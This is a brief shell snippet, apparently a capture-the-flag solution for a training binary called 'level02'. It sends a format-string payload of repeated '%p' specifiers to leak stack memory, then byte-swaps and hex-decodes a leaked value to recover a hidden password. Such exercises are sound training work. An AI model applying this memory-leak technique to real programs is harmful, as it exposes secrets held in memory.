(python -c 'print("%p" * 30)'; python -c 'print("A" * 2)') | ./level02

echo '756e50523437684845414a3561733951377a7143574e6758354a35686e47587348336750664b394d' \
| sed 's/.\{16\}/& /g' \
| awk '{
    for (i = 1; i <= NF; i++) {
        s = $i;
        for (j = 14; j >= 0; j -= 2)
            printf "%s", substr(s, j+1, 2);
    }
}' \
| xxd -r -p